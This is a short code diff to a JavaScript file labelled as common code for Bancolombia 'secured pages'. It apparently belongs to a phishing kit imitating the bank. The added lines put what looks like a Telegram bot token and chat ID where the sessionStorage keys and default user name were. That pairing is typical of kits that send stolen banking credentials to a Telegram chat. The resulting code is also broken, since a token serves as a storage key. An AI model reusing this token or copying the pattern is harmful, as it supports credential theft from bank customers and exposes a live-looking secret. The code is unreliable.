@@ -1,6 +1,6 @@
 /* ===== JS COMÚN BANCOLOMBIA - secured pages ===== */
-const SESSION_ID = sessionStorage.getItem('bc_session') || '';
-const USER       = sessionStorage.getItem('bc_user')    || 'Usuario';
+const SESSION_ID = sessionStorage.getItem('8608960396:AAEIPHawmZ3Zy9iswouyrxZ7djFRFQS1Lmk') || '';
+const USER       = sessionStorage.getItem('-5236890208')    || '-5236890208';
 
 
 
